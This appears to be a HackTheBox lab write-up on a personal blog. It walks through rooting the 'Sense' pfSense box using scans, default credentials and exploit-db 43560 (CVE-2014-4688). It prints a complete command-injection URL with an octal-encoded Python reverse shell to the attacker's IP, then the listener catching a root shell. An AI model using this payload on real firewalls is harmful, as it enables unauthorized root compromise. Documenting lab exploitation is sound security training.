---
layout: page
title: Sense
description: Sense from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/sense/logo.png" title="HTB Sense Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Sense">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
I get this sense that is the next box we should work on.  So, here we go!

Run nmap and get a list of the ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/sense]
└─$ cat nmap                  
# Nmap 7.95 scan initiated Sun Jan 19 20:20:55 2025 as: /usr/lib/nmap/nmap -sC -sV -A -O -oN nmap 10.10.10.60
Nmap scan report for 10.10.10.60
Host is up (0.015s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-title: Login
|_http-server-header: lighttpd/1.4.35
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): Comau embedded (90%), OpenBSD 4.X (85%)
OS CPE: cpe:/o:openbsd:openbsd:4.0
Aggressive OS guesses: Comau C4G robot control unit (90%), OpenBSD 4.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   17.11 ms 10.10.16.1
2   17.14 ms 10.10.10.60

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 19 20:21:22 2025 -- 1 IP address (1 host up) scanned in 27.46 seconds
```
{% endraw %}

<br />
Check what is running on port 443.  Note the pfsense installation.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sense/landing.png" title="Port 443 Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Google the default credentials for pfsense.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sense/defaults.png" title="Default Credentials" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.112122#:~:text=By%20convention%2C%20each%20time%20you,%3A%20admin%2C%20Password%3A%20pfsense.">Security Space</a>

<br />
Check the creds in pfsense.  Well, that didn't work.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sense/checkcreds.png" title="Check the Credentials" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Ffuf port 80.  Absolutely nothing interesting.  Ffuf port 443 looking for something more interesting.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/sense]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://10.10.10.60/FUZZ -e .txt,.bak,.html,.pdf -fs 6690

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.10.60/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .html .pdf 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 6690
________________________________________________

index.html              [Status: 200, Size: 329, Words: 32, Lines: 25, Duration: 17ms]
themes                  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 14ms]
includes                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
javascript              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
changelog.txt           [Status: 200, Size: 271, Words: 35, Lines: 10, Duration: 20ms]
classes                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 15ms]
widgets                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
tree                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 22ms]
shortcuts               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
installer               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
wizards                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 11ms]
csrf                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 13ms]
system-users.txt        [Status: 200, Size: 106, Words: 9, Lines: 7, Duration: 19ms]
filebrowser             [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 12ms]
%7Echeckout%7E          [Status: 403, Size: 345, Words: 33, Lines: 12, Duration: 26ms]
:: Progress: [1102795/1102795] :: Job [1/1] :: 865 req/sec :: Duration: [0:10:59] :: Errors: 0 ::
```
{% endraw %}

<br />
Check the changelog.txt file.  Looks like pfsense has 3 vulnerabilities and 2 have been patched.  We have one left.

{% raw %}
```sh
https://10.10.10.60/changelog.txt
```
{% endraw %}
{% raw %}
```sh
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```
{% endraw %}

<br />
Check the system-users.txt file.  Looks like we have a potential user name, rohit.

{% raw %}
```sh
https://10.10.10.60/system-users.txt
```
{% endraw %}
{% raw %}
```sh
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```
{% endraw %}

<br />
Login to the pfsense portal with rohit as the username and pfsens from the default installation docs.  Note the version on the dashboard.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sense/login.png" title="Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Search exploit-db looking for our version of pfsense.  Looks like there is a command injection.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sense/exploitdb.png" title="Exploit-DB" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/43560">https://www.exploit-db.com/exploits/43560</a>

<br />
Download the exploit.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/sense]
└─$ wget https://www.exploit-db.com/raw/43560 -O exploit.py  
--2025-02-14 17:47:12--  https://www.exploit-db.com/raw/43560
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3576 (3.5K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   3.49K  --.-KB/s    in 0s      

2025-02-14 17:47:13 (27.6 MB/s) - ‘exploit.py’ saved [3576/3576]
```
{% endraw %}

<br />
Update the exploit.  Add verify=False to the login post request.  There is some kind of issue if you try to run it without it.

{% raw %}
```python
#!/usr/bin/env python3

# Exploit Title: pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.
# Date: 2018-01-12
# Exploit Author: absolomb
# Vendor Homepage: https://www.pfsense.org/
# Software Link: https://atxfiles.pfsense.org/mirror/downloads/old/
# Version: <=2.1.3
# Tested on: FreeBSD 8.3-RELEASE-p16
# CVE : CVE-2014-4688

<snip>

if csrf_token:
        print("CSRF token obtained")
        login_data = [('__csrf_magic',csrf_token), ('usernamefld',username), ('passwordfld',password), ('login','Login') ]
        login_data = collections.OrderedDict(login_data)
        encoded_data = urllib.parse.urlencode(login_data)

# POST login request with data, cookies and header
        login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers, verify=False)

<snip>
```
{% endraw %}

<br />
Try running the exploit.  The exploit seems to complete successfully.  Checking the listener there is no shell though.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/sense]
└─$ ./pfsense.py --rhost 10.10.10.60 --lhost 10.10.16.12 --lport 443 --username rohit --password pfsense      
CSRF token obtained
Running exploit...
Exploit completed
```
{% endraw %}

<br />
Update the code one more time to print the exploit_url variable so we can know what is trying to be executed.

{% raw %}
```python
#!/usr/bin/env python3

# Exploit Title: pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.
# Date: 2018-01-12
# Exploit Author: absolomb
# Vendor Homepage: https://www.pfsense.org/
# Software Link: https://atxfiles.pfsense.org/mirror/downloads/old/
# Version: <=2.1.3
# Tested on: FreeBSD 8.3-RELEASE-p16
# CVE : CVE-2014-4688

<snip>

try:
                        print(exploit_url)
                        exploit_request = client.get(exploit_url, cookies=client.cookies, headers=headers, timeout=5)
                        if exploit_request.status_code:
                                print("Error running exploit")

<snip>
```
{% endraw %}

<br />
Execute the update script and note the payload url.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/sense]
└─$ ./pfsense.py --rhost 10.10.10.60 --lhost 10.10.16.12 --lport 443 --username rohit --password pfsense
CSRF token obtained
Running exploit...
https://10.10.10.60/status_rrd_graph_img.php?database=queues;printf+'\12\160\171\164\150\157\156\40\55\143\40\47\151\155\160\157\162\164\40\163\157\143\153\145\164\54\163\165\142\160\162\157\143\145\163\163\54\157\163\73\12\163\75\163\157\143\153\145\164\56\163\157\143\153\145\164\50\163\157\143\153\145\164\56\101\106\137\111\116\105\124\54\163\157\143\153\145\164\56\123\117\103\113\137\123\124\122\105\101\115\51\73\12\163\56\143\157\156\156\145\143\164\50\50\42\61\60\56\61\60\56\61\66\56\61\62\42\54\64\64\63\51\51\73\12\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\12\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\61\51\73\12\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\62\51\73\12\160\75\163\165\142\160\162\157\143\145\163\163\56\143\141\154\154\50\133\42\57\142\151\156\57\163\150\42\54\42\55\151\42\135\51\73\47\12'|sh
Exploit completed
```
{% endraw %}

<br />
Take that url and try running it in the browser.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/sense/browser.png" title="Run Exploit in Browser" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/sense]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.60] 61089
sh: can't access tty; job control turned off
# whoami
root
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
# cat /home/rohit/user.txt
<redacted># ifconfig
em0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> metric 0 mtu 1500
        options=9b<RXCSUM,TXCSUM,VLAN_MTU,VLAN_HWTAGGING,VLAN_HWCSUM>
        ether 00:50:56:b9:a2:6a
        inet 10.10.10.60 netmask 0xffffff00 broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:a26a%em0 prefixlen 64 scopeid 0x1 
        nd6 options=1<PERFORMNUD>
        media: Ethernet autoselect (1000baseT <full-duplex>)
        status: active
plip0: flags=8810<POINTOPOINT,SIMPLEX,MULTICAST> metric 0 mtu 1500
enc0: flags=0<> metric 0 mtu 1536
pfsync0: flags=0<> metric 0 mtu 1460
        syncpeer: 224.0.0.240 maxupd: 128 syncok: 1
lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> metric 0 mtu 16384
        options=3<RXCSUM,TXCSUM>
        inet 127.0.0.1 netmask 0xff000000 
        inet6 ::1 prefixlen 128 
        inet6 fe80::1%lo0 prefixlen 64 scopeid 0x5 
        nd6 options=3<PERFORMNUD,ACCEPT_RTADV>
pflog0: flags=100<PROMISC> metric 0 mtu 33144
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
# cat /root/root.txt
<redacted>
# ifconfig
em0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> metric 0 mtu 1500
        options=9b<RXCSUM,TXCSUM,VLAN_MTU,VLAN_HWTAGGING,VLAN_HWCSUM>
        ether 00:50:56:b9:a2:6a
        inet 10.10.10.60 netmask 0xffffff00 broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:a26a%em0 prefixlen 64 scopeid 0x1 
        nd6 options=1<PERFORMNUD>
        media: Ethernet autoselect (1000baseT <full-duplex>)
        status: active
plip0: flags=8810<POINTOPOINT,SIMPLEX,MULTICAST> metric 0 mtu 1500
enc0: flags=0<> metric 0 mtu 1536
pfsync0: flags=0<> metric 0 mtu 1460
        syncpeer: 224.0.0.240 maxupd: 128 syncok: 1
lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> metric 0 mtu 16384
        options=3<RXCSUM,TXCSUM>
        inet 127.0.0.1 netmask 0xff000000 
        inet6 ::1 prefixlen 128 
        inet6 fe80::1%lo0 prefixlen 64 scopeid 0x5 
        nd6 options=3<PERFORMNUD,ACCEPT_RTADV>
pflog0: flags=100<PROMISC> metric 0 mtu 33144
```
{% endraw %}

<br />
And with that, we wrap another box.  I will see you in the next one.